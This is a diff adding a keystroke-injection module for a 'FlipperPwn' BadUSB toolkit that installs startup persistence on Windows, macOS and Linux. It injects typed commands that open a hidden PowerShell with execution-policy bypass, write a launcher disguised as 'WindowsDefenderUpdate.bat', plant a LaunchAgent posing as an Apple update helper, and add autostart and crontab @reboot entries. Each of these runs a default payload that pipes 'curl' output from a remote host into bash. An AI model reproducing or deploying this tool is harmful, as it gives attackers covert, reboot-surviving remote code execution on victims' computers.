@@ -1,0 +1,67 @@
+# FlipperPwn Module: Cross-Platform Startup Persistence
+# Installs a persistence entry that survives reboot for the current user.
+# No admin required on any platform — uses user-writable persistence locations.
+#
+# Windows:   Shell:startup folder (~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
+#            Creates a .bat launcher in the startup folder
+# macOS:     LaunchAgent plist in ~/Library/LaunchAgents/
+#            Runs at login via launchd
+# Linux:     XDG autostart .desktop entry in ~/.config/autostart/
+#            crontab @reboot entry as fallback
+
+NAME persist_startup
+DESCRIPTION Install user-level startup persistence (no admin required) on Windows, macOS, and Linux
+CATEGORY post
+PLATFORMS WIN,MAC,LINUX
+
+OPTION PAYLOAD_CMD curl -s http://10.0.0.1/beacon | bash "Command to execute at startup/login"
+
+PLATFORM WIN
+  # Open hidden PowerShell via Run dialog
+  DELAY 500
+  GUI r
+  DELAY 300
+  STRING powershell -w h -nop -ep bypass
+  ENTER
+  DELAY 1000
+  # Write a .bat file to the current user's Startup folder.
+  # The bat runs the payload command silently via cmd /c start /min.
+  # shell:startup resolves correctly regardless of username or drive letter.
+  STRING $su=[Environment]::GetFolderPath("Startup"); $bat="$su\WindowsDefenderUpdate.bat"; "@echo off`r`ncmd /c start /min `"winupd`" {{PAYLOAD_CMD}}" | Out-File $bat -Encoding ASCII; Write-Host "Startup entry created: $bat"
+  ENTER
+
+PLATFORM MAC
+  # Open Terminal via Spotlight
+  DELAY 500
+  GUI SPACE
+  DELAY 400
+  STRING Terminal
+  ENTER
+  DELAY 1200
+  # Create a launchd LaunchAgent plist. launchd reads this at login automatically.
+  # RunAtLoad=true means it fires immediately on login.
+  STRING mkdir -p ~/Library/LaunchAgents; cat > ~/Library/LaunchAgents/com.apple.updatehelper.plist << 'EOF'
+  ENTER
+  DELAY 200
+  STRING <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.apple.updatehelper</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>{{PAYLOAD_CMD}}</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>3600</integer></dict></plist>
+  ENTER
+  DELAY 200
+  STRING EOF
+  ENTER
+  DELAY 300
+  # Load the agent into the current launchd session immediately
+  STRING launchctl load ~/Library/LaunchAgents/com.apple.updatehelper.plist 2>/dev/null; echo "LaunchAgent installed"
+  ENTER
+
+PLATFORM LINUX
+  # Open terminal emulator
+  DELAY 500
+  CTRL ALT t
+  DELAY 1000
+  # Primary method: XDG autostart .desktop file (works with GNOME, KDE, XFCE)
+  STRING mkdir -p ~/.config/autostart; printf '[Desktop Entry]\nType=Application\nName=Update Helper\nExec=/bin/bash -c "{{PAYLOAD_CMD}}"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n' > ~/.config/autostart/update-helper.desktop; echo "XDG autostart entry created"
+  ENTER
+  DELAY 300
+  # Fallback: crontab @reboot entry (works on any Linux, even without a desktop environment)
+  STRING (crontab -l 2>/dev/null; echo "@reboot /bin/bash -c '{{PAYLOAD_CMD}}'") | crontab -; echo "crontab @reboot entry added"
+  ENTER
